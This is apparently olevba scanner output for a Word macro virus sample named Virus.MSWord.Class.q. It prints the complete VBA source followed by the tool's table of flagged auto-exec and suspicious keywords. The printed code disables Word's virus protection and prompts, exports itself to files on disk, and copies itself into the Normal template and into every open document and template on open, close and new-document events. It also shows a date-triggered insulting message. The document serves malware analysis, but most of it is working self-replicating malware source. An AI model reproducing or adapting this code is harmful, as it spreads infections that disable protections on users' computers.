olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Sub autoOpen()
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
On Error GoTo out
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Options.VirusProtection = False
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Options.SaveNormalPrompt = False
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Options.ConfirmConversions = False
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If nt > 70 And ad > 0 Then GoTo out
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If nt < 70 Then
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
End If
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
host.CodeModule.AddFromFile ("c:\class.sys")
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
With host.CodeModule
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    For x = 1 To 4
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    .DeleteLines 1
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    Next x
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
End With
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If nt < 70 Then
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    With host.CodeModule
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    .replaceline 1, "Sub AutoClose()"
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    .replaceline 71, "Sub ToolsMacro()"
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    End With
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
End If
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
With host.CodeModule
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    For x = 2 To 72 Step 2
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
    Next x
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
End With
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
out:
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Sub ToolsMacro()
'Arvind8/4/99 10:17:53 AMHP LaserJet 6P/6MP - PostScript on LPT1:clip
Sub ViewVBCode()
'Arvind4/1/99 9:36:40 AMHP LaserJet 6P/6MP - Enhanced on LPT1:clip
End Sub


Private Sub Document_Close()
On Error Resume Next
Kill "c:\footprint.$$?"
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    If Not adoc.CustomDocumentProperties("FootPrint1") Then
        adoc.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint1") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

